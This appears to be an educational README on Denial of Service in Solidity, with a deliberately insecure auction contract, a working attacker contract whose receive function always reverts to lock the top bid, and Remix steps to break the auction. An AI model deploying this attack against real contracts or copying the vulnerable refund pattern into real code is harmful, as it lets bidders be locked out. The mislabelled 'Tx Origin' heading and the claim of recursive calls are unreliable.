# What is DOS Attack?
 DoS is short for Denial of Service. Any interference with a Service that reduces or loses its availability is called a Denial of Service. Simply put, normal service requests that a user needs cannot be processed by the system. For example, when a computer system crashes or its bandwidth is exhausted or its hard disk is filled up so that it cannot provide normal service, it constitutes a DoS. In this implementaiton we have a contract called auciton which is vulnerable to DoS attack. 

```solidity 
 // SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
// Denial of service attack, an attack can make fail line 13 by a fallback function that always fails and thus achieve "Denial of service"
// to keep his bidding position

// INSECURE
contract Auction {
    address payable public currentLeader;
    uint public highestBid;

    function bid() payable external {
        require(msg.value > highestBid);

        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert

        currentLeader = payable(msg.sender);
        highestBid = msg.value;
    }
}


``` 


And there is a attacker contact which  actually takes the smart contract address as the highest bidder and recursively call the function. 

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface Iauction{
        function bid() payable external;
}

contract attackt004{
         address public owner;
         Iauction public immutable auc;

        constructor (address  addr){
            auc = Iauction(addr);
            owner = msg.sender;
         }

        function attack() external payable {
            auc.bid{value: msg.value}();
        }

        receive() external payable {
                      revert();
        }                     
}

```

# How does it happen?
In Solidity, a DoS vulnerability can be simply understood as “unrecoverable malicious manipulation or uncontrolled unlimited resource consumption”, i.e. a DoS attack on an Ethereum contract that could result in massive consumption of Ether and Gas and, worse, render the original contract code logic unworkable.


 

# Example of Tx Origin Attack.
 For example, there are three checkout points in the supermarket. Normally, people queue up to pay by scanning the code at the checkout point. However, one day, there was an Internet problem, and all the customers at the checkout point failed to scan the code and pay. Or, when paying, customers deliberately make trouble, so that the following customers can not pay, which will also lead to the supermarket can not operate. We can see that there are internal ones, that can cause the DoS attacks

# How to prevent?
 For external operation mapping or array loop, need to limit the length; For the owner operation, the non-uniqueness of the contract should be considered, and the whole business should not be paralyzed because of a certain permission account. Based on the external call progress state need to except the handling of function calls, without any harm in general internal function calls, if the call is a failure will be back, and the external call is uncertain, we don’t know what the external caller wants to do if being attacked by the attacker, it may cause serious consequences.

# How to use our code: 
 - First you need to deploy the auction contract code in remix ide. 
 - Perform some biddign  and each time highest bidder will be changed.
 - Deploy the attack code putting the auction contact address as a parameter.
 - Then perform the bid using the attack  funciton from the attack file. Then the auction contract will be broken.  
